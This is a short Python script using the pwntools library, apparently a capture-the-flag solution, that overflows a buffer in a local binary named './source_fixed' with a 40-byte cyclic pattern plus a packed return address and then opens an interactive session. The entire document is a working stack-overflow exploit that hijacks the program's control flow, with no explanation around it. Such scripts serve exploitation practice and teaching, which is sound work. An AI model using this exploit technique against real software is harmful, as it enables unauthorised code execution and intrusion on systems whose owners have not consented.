from pwn import *

payload = cyclic(40) + p64(0x00000000004011b6)
target = process('./source_fixed')
target.sendline(payload)
target.interactive()
